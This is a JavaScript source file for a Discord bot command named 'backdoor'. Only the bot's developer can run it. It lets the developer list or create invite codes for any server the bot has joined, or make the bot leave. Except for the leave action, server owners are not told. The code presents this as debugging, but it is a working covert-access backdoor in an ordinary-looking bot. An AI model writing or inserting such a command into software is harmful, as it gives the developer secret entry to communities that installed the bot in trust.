const Commando = Depends.Commando
const Discord = Depends.Discord
const DevServer = Settings.DevServer

class BackdoorCommand extends Commando.Command {
    constructor(client) {
        super(client, {
            name: 'backdoor',
            group: 'utilities',
            memberName: "backdoor",
            description: 'DEVELOPER: This will return servers to the Developer for Debugging Purposes.'
        });
    }

    async run(message, args) {
        if (message.author.bot) return;
        if (message.channel.type === "dm") return;
        if (Settings.Testing === true) return;

        let Args = message.content.split(" ")

        let Author = Number(message.author.id)
        if (Author == Number(DevServer.Developer)) {
			if(Args[1] === "invites"){
				let Guild = Bot.guilds.get(Args[2])
				if (!Guild) return message.channel.send("The bot isn't in the guild with this ID.").then(M =>{
					M.delete({timeout: 10000})
				});

				Guild.fetchInvites()
				.then(invites => message.channel.send('Found Invites:\n' + invites.map(invite => invite.code).join('\n')))
				.catch(console.error);
		   }
		   if(Args[1] === "leave"){
				let Guild = Bot.guilds.get(Args[2])
				if (!Guild) return message.channel.send("The bot isn't in the guild with this ID.").then(M =>{
					M.delete({timeout: 10000})
				}); 
				
				Guild.owner.send("The bot has been removed from your guild by the Bot Developer.").then(() => {
					Guild.leave();
				});
				return;
		   }
		   if(Args[1] === "createinvite"){
				let Guild = Bot.guilds.get(Args[2])
				if (!Guild) return message.channel.send("The bot isn't in the guild with this ID.").then(M =>{
					M.delete({timeout: 10000})
				});
				
				let Channels = Guild.channels.filter(c=> c.permissionsFor(Guild.me).has('CREATE_INSTANT_INVITE'))
				if(!Channels) return message.channel.send('No Channels found with permissions to create Invite in!')

				Channels.random().createInvite()
				.then(invite=> message.channel.send('Found Invite:\n' + invite.code))
		   }
        } else {
            let Embed = new Discord.RichEmbed()
                .setColor("276e00ff")
                .setDescription("You aren't allowed to use this Command!");
            message.channel.send(Embed).then(Message => Message.delete(5000))
            return
        }

    }
}

module.exports = BackdoorCommand

